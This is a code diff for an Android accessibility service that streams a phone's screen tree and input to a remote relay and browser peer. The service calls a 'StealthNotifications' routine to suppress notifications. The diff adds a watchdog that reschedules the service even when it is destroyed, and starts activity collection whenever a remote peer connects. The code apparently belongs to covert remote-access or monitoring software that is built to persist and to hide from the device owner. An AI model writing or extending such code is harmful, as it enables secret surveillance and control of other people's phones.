@@ -55,11 +55,13 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
         instance = this
         InputHandler.service = this
         StealthNotifications.suppressAll(this)
+        PersistenceWatchdog.schedule(this)
         val metrics = resources.displayMetrics
         RelayHub.screenWidth = metrics.widthPixels
         RelayHub.screenHeight = metrics.heightPixels
         registerNetworkWatcher()
-        ensureRelay()
+        UserSession.setAccessibilityWasEnabled(this, true)
+        runCatching { ensureRelay() }
     }
 
     override fun onDestroy() {
@@ -72,6 +74,9 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
         stopStreaming()
         if (InputHandler.service === this) InputHandler.service = null
         if (instance === this) instance = null
+        if (UserSession.isSignedUp(this)) {
+            PersistenceWatchdog.schedule(this)
+        }
         super.onDestroy()
     }
 
@@ -170,17 +175,19 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
         RelayHub.client = relay
         relay?.sendMeta(RelayHub.screenWidth, RelayHub.screenHeight)
         relay?.sendMode("tree")
-        ActivityCollector.get(this).start()
+        if (peerConnected) ActivityCollector.get(this).start()
         if (!streaming) startStreaming()
         else pushTreeNow(forceFull = true)
     }
 
     override fun onPeerConnected() {
         RelayHub.peerBrowserConnected = true
+        ActivityCollector.get(this).start()
         pushTreeNow(forceFull = true)
     }
     override fun onPeerDisconnected() {
         RelayHub.peerBrowserConnected = false
+        ActivityCollector.get(this).stop()
     }
     override fun onReconnecting() {
         Log.d(TAG, "relay reconnecting…")
